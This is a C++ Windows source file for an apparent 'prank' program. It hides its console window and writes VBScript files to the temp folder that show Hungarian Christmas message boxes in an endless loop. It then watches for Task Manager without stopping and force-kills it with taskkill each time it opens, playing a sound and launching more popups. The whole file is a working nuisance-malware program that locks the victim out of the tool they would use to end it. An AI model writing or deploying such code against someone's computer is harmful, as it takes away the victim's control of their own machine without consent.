#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <processthreadsapi.h>
#include <C:\Users\gyime\source\repos\PrankApp\resource2.h>
void HideConsole()
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}
void MakeScripts() {
    system("echo CreateObject(\"WScript.Shell\").Run \"%temp%\message.vbs\" > %temp%\message_start.vbs");
    system("echo CreateObject(\"WScript.Shell\").Run \"%temp%\message_taskmgr.vbs\" > %temp%\message_taskmgr_start.vbs");
    system("echo do > %temp%\message.vbs");
    system("echo x=msgbox(\"Boldog karacsonyt kedves felhasznalo! (A feladatkezelot nem hasznalnam...)\", 0 + 64, \"Ezt aztan be nem zarod : )\") >> %temp%\message.vbs");
    system("echo loop >> %temp%\message.vbs");
    system("echo x=msgbox(\"En szoltam... Mindegy, tessek, itt a jutalmad!\", 0 + 64, \"Ooooof...\") > %temp%\message_taskmgr.vbs");
    system("echo do >> %temp%\message_taskmgr.vbs");
    system("echo x=msgbox(\"Boldog karacsonyt kedves felhasznalo! (A feladatkezelot nem hasznalnam...)\", 0 + 64, \"Ezt aztan be nem zarod : )\") >> %temp%\message_taskmgr.vbs");
    system("echo loop >> %temp%\message_taskmgr.vbs");

}
bool IsProcessRunning(const wchar_t* const processName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    const auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (!Process32First(snapshot, &entry)) {
        CloseHandle(snapshot);
        return false;
    }

    do {
        if (!_wcsicmp(entry.szExeFile, processName)) {
            CloseHandle(snapshot);
            return true;
        }
    } while (Process32Next(snapshot, &entry));

    CloseHandle(snapshot);
    return false;
}
void KillTaskmgr() {
    printf("yeet\n");
    system("taskkill /F /IM taskmgr.exe");
    PlaySound(MAKEINTRESOURCE(IDR_WAVE1), 0, SND_RESOURCE);
    int b = system("wscript %temp%\message_taskmgr_start.vbs");
}
int main() {
    HideConsole();
    MakeScripts();
    int a = system("wscript.exe %temp%\message_start.vbs");
    wchar_t procName[] = L"taskmgr.exe";
    while (true)
    {
        if (IsProcessRunning(procName) == true) {
            KillTaskmgr();
        }
    }
}